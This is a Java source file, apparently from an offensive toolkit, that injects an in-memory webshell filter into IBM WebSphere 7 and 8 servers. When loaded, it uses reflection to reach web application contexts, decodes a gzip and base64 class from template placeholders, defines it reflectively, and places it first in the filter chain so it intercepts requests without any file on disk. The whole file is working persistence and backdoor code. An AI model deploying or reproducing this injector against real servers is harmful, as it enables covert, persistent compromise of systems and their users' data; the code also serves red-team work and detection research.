package com.reajason.javaweb.memshell.websphere.injector;

import javax.servlet.Filter;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;


/**
 * tested v7、v8
 * update  2023/07/08
 *
 * @author ReaJason
 */
public class WebSphereFilterInjector {

    static {
        new WebSphereFilterInjector();
    }

    public WebSphereFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getShell(context);
                inject(context, filter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }


    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Object context;
        Object obj = getFieldValue(Thread.currentThread(), "wsThreadLocals");
        Object[] wsThreadLocals = (Object[]) obj;
        for (Object wsThreadLocal : wsThreadLocals) {
            obj = wsThreadLocal;
            // for websphere 7.x
            if (obj != null && obj.getClass().getName().endsWith("FastStack")) {
                Object[] stackList = (Object[]) getFieldValue(obj, "stack");
                for (Object stack : stackList) {
                    try {
                        Object config = getFieldValue(stack, "config");
                        context = getFieldValue(getFieldValue(config, "context"), "context");
                        contexts.add(context);
                    } catch (Exception ignored) {
                    }
                }
            } else if (obj != null && obj.getClass().getName().endsWith("WebContainerRequestState")) {
                context = getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(obj, "currentThreadsIExtendedRequest"), "_dispatchContext"), "_webapp"), "facade"), "context");
                contexts.add(context);
            }
        }
        return contexts;
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            return classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }


    @SuppressWarnings("unchecked")
    public void inject(Object context, Object filter) throws Exception {
        if (isInjected(context)) {
            System.out.println("filter already injected");
            return;
        }

        Class<?> filterMappingClass;
        Class<?> iFilterConfigClass;
        Class<?> iServletConfigClass;
        ClassLoader classLoader;
        try {
            classLoader = context.getClass().getClassLoader();
            filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
            iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
            iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");
        } catch (Exception e) {
            classLoader = Thread.currentThread().getContextClassLoader();
            filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
            iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
            iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");
        }

        Object filterManager = getFieldValue(context, "filterManager");
        try {
            // v8
            Constructor<?> constructor = filterMappingClass.getConstructor(String.class, iFilterConfigClass, iServletConfigClass);
            // com.ibm.ws.webcontainer.webapp.WebApp.commonAddFilter
            setFieldValue(context, "initialized", false);
            Object filterConfig = invokeMethod(context, "commonAddFilter", new Class[]{String.class, String.class, Filter.class, Class.class}, new Object[]{getClassName(), getClassName(), filter, filter.getClass()});
            Object filterMapping = constructor.newInstance(getUrlPattern(), filterConfig, null);
            setFieldValue(context, "initialized", true);

            // com.ibm.ws.webcontainer.filter.WebAppFilterManager.addFilterMapping
            invokeMethod(filterManager, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMapping});

            // com.ibm.ws.webcontainer.filter.WebAppFilterManager#_loadFilter
            invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{getClassName()});

        } catch (Exception e) {
            // v7
            Object filterConfig = invokeMethod(context, "createFilterConfig", new Class[]{String.class}, new Object[]{getClassName()});
            invokeMethod(filterConfig, "setFilterClassName", new Class[]{String.class}, new Object[]{filter.getClass().getName()});
            setFieldValue(filterConfig, "dispatchMode", new int[]{0});
            setFieldValue(filterConfig, "name", getClassName());
            invokeMethod(context, "addMappingFilter", new Class[]{String.class, iFilterConfigClass}, new Object[]{getUrlPattern(), filterConfig});
            List<Object> uriFilterMappings = (ArrayList<Object>) getFieldValue(filterManager, "uriFilterMappings");
            int lastIndex = uriFilterMappings.size() - 1;
            Object lastElement = uriFilterMappings.remove(lastIndex);
            uriFilterMappings.add(0, lastElement);
            invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{getClassName()});
        }
        // 清除缓存
        invokeMethod(getFieldValue(filterManager, "chainCache"), "clear", null, null);
        System.out.println("filter injected successfully");
    }

    public boolean isInjected(Object context) throws Exception {
        Object webAppConfiguration = getFieldValue(context, "config");
        return invokeMethod(webAppConfiguration, "getFilterInfo", new Class[]{String.class}, new Object[]{getClassName()}) != null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws
            Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }


    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        try {
            Field field = getField(obj, name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (NoSuchFieldException ignored) {
        }
        return null;
    }
}
